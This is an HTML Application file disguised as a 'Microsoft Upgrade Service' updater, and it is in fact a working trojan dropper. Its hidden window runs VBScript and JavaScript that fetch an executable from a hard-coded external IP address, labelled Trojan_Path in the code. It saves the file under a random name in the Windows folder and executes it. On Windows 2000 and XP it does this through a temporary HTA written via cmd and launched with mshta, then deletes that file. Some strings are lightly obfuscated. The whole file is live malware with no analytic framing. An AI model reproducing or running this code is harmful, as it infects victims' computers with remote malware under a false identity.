<HTML><HEAD><TITLE>Microsoft Upgrade Service NT  </TITLE>
<HTA:APPLICATION id=PlugInst
APPLICATIONNAME="MicrofoftUpdater"
SHOWINTASKBAR=NO
CAPTION=YES
SINGLEINSTANCE=YES
MAXIMIZEBUTTON=NO
MINIMIZEBUTTON=NO
WINDOWSTATE=MINIMIZE
/></HEAD>
<OBJECT id="MSmedia" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></OBJECT>
<BODY>

<TEXTAREA id="Main_HTA">
<HTML><HEAD>
<HTA:APPLICATION id=PXP
 APPLICATIONNAME="PXP"
 SHOWINTASKBAR=NO
 CAPTION=YES
 SINGLEINSTANCE=YES
 MAXIMIZEBUTTON=NO
 MINIMIZEBUTTON=NO
 WINDOWSTATE=MINIMIZE
 />
</HEAD>
<BODY>
<SCRIPT> 
self.moveTo(5000,5000);
function Dl(Rp,Ln)
{
try
{
var oo=new ActiveXObject("MSScriptControl.ScriptControl");  
oo.Language="javascript";  
oo.Reset();
var ff=new ActiveXObject("Microsoft.XMLHTTP"); 
ff.Open("GET",Rp,0); 
ff.Send();   
sAX=unescape("%41DODB%2eStream");
var oS=new ActiveXObject(sAX); 
oo.AddObject("oAS", oS);
oo.AddObject("oXS", ff);
aC="var XB=oXS.responseBody;oAS.Type=1;oAS.Mode=3;oAS.Open();oAS.Write(XB);"+"oAS.Sa"+"veToFile('"+Ln+"',2);";
var oA=new ActiveXObject("Shell.Application");
oo.ExecuteStatement(aC);
oA.ShellExecute(Ln);
r=0;
}
catch(e){r=-1;}
return r;
}
</TEXTAREA>

<SCRIPT language="VBScript">
     ssfDESKTOP = 0
     ssfPROGRAMS = 2
     ssfSTARTMENU = 11
     ssfDESKTOPDIRECTORY = 16
     ssfFONTS=20
     ssfCOMMONSTARTMENU = 22
     ssfCOMMONPROGRAMS = 23
     ssfCOMMONSTARTUP = 24
     ssfCOMMONDESKTOPDIR = 25
     ssfCOMMONALTSTARTUP = 30
     ssfCOMMONFAVORITES = 31
     ssfCOMMONAPPDATA = 35
     ssfWINDOWS = 36
     ssfSYSTEM = 37
    
     Dim oShellApp
     Dim oFolder
     Dim oFolderItem
     Dim WinDir
     Dim PluginFile
     Dim XMLBody
     Dim cByte
     Dim ByteCode
     Dim Main_HTA_Body
     Dim Cmd_Params
     Dim Trojan_Path
     Dim IntervalID
     Dim nCmdCalled
     
     nCmdCalled=0
     InitPaths()
     Randomize

     self.MoveTo 6000,6000
 
     ExeName=GenerateName()
     ExeName=ExeName & ".exe"
     HTAName=GenerateName()
     HTAName=HTAName & ".hta" 
      
     Set oShellApp = CreateObject("Shell.Application")
     Set oFolder = oShellApp.NameSpace(ssfFONTS)
     Set oFolderItem=oFolder.ParseName("Symbol.ttf")
     Font_Path_Components=Split(oFolderItem.Path,"\",-1,1)
     WinDir= Font_Path_Components(0) & "\" &  Font_Path_Components(1) & "\"
     ExeName=WinDir & ExeName
     HTAName=WinDir & HTAName

     Call Run_Installer 
     setTimeout "HangUp()",9000
       
Sub  Run_Installer
     
     Main_HTA_Body=document.all.Main_HTA.innerText
     Download_Call="Dl('" & Trojan_Path & "'"  & "," & "'" & ExeName & "'" & ");"
     Download_Call=Replace(Download_Call,"\","\\\\")
     Main_HTA_Body= Main_HTA_Body &  Download_Call
     Main_HTA_Body= Main_HTA_Body & "self.close();</SCR" & "IPT></BODY></HTML>"
     Main_HTA_Body=Replace(Main_HTA_Body,vbCrLf,"")
     Main_HTA_Body=Replace(Main_HTA_Body,">","^>")
     Main_HTA_Body=Replace(Main_HTA_Body,"<","^<")
     WinOS=Get_Win_Version
     Select Case WinOS 

            Case "2K"
 
                                                                                
  
            Cmd_Params="/c echo " & Main_HTA_Body & " > " & HTAName
            oShellApp.ShellExecute "cmd",Cmd_Params,"open"
            oShellApp.ShellExecute "mshta",HTAName
            Cmd_Params="/c del " &  HTAName
            IntervalID=setInterval("Delete_HTA(Cmd_Params)",3000) 

            Case "XP"
 
                                                                                
  
            Cmd_Params="/c echo " & Main_HTA_Body & " > " & HTAName
            oShellApp.ShellExecute "cmd",Cmd_Params,"open"
            oShellApp.ShellExecute "mshta",HTAName
            Cmd_Params="/c del " &  HTAName
            IntervalID=setInterval("Delete_HTA(Cmd_Params)",3000) 
         
            Case Else

            Call Download_and_Execute(Trojan_Path,ExeName)
                     
      End Select      
 
End  Sub 

Sub Download_and_Execute(Remote_path,Local_name)

set oXMLHTTP = CreateObject("Microsoft.XMLHTTP")
Module_Path=Remote_path
OpenSession()
GetStatus=GetFile()
 
   If GetStatus=0 Then 
   Plugin_size=LenB(XMLBody)
   
   Set PluginFile=MSmedia.CreateTextFile(Local_name, TRUE)

   For j=1 To Plugin_size 
       cByte=MidB(XMLBody,j,1)
       ByteCode=AscB(cByte)
       WriteFile()
   Next

   PluginFile.Close
  
   set WSHShell=CreateObject("WScript.Shell")
   On Error Resume Next
   WSHShell.Run (Local_name),1,FALSE
   End If
set  oXMLHTTP=Nothing

End Sub

Function HangUp()
         clearInterval(IntervalID)
         self.Close
End      Function

Function Delete_HTA(params)
        If nCmdCalled<4 Then
           oShellApp.ShellExecute "cmd",params
           nCmdCalled=nCmdCalled+1
        End If
End Function   

Function Get_Win_Version()

     IEversion=navigator.appVersion
     If InStr(IEversion,"Windows 95") <> 0  Then
        Get_Win_Version="95"
     ElseIf InStr(IEversion,"Windows NT 4") <> 0  Then
        Get_Win_Version="NT"
     ElseIf InStr(IEversion,"Win 9x 4.9") <> 0  Then
        Get_Win_Version="ME"
     ElseIf InStr(IEversion,"Windows 98") <> 0  Then
        Get_Win_Version="98"
     ElseIf InStr(IEversion,"Windows NT 5.0") <> 0  Then
        Get_Win_Version="2K"
     ElseIf InStr(IEversion,"Windows NT 5.1") <> 0  Then
        Get_Win_Version="XP"
     Else 
        Get_Win_Version="Unknown"
     End If
     
End Function

Function WriteFile
PluginFile.Write(Chr(ByteCode))
End Function

Function GetFile
     oXMLHTTP.Send() 
     On Error Resume Next
     XMLBody=oXMLHTTP.responseBody
     If Err.number <> 0 Then
        GetFile=-1 
     Else
        GetFile=0 
     End  If     
End Function

Function OpenSession
Req_type="G" & "E" & "T"
HTTPSession=oXMLHTTP.Open(Req_Type,Module_Path,0) 
End Function

Function GenerateName()
RandomName=""
rr=Int(8*Rnd)
ik=0
Do
ii=Int(25*Rnd)+97
RandomName=RandomName+Chr(ii)
ik=ik+1
Loop While ik<rr
GenerateName=RandomName
End Function

Function InitPaths
Trojan_Path = "http://195.225.177.38/six/get.php?file=exe" 

End Function
</SCRIPT>

</BODY></HTML>

